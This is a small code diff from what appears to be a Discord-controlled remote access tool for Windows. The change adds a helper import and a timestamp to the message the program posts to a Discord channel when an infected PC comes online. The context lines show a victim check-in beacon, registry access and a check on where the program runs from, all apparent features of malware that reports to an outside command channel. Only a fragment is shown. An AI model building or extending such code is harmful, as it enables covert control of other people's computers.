@@ -5,6 +5,7 @@ import os
 import sys
 from getpass import getuser
 import winreg
+from resources.misc import *
 
 client = discord.Client(intents=discord.Intents.all())
 
@@ -33,7 +34,7 @@ if sys.argv[0].lower() != 'c:\\users\\' + getuser() + '\\' + software_directory_
 
 @client.event
 async def on_ready():  
-    await client.get_channel(channel_ids['main']).send('New PC session')
+    await client.get_channel(channel_ids['main']).send('[' + current_time() + '] New PC session')
 
 @client.event
 async def on_message(message):
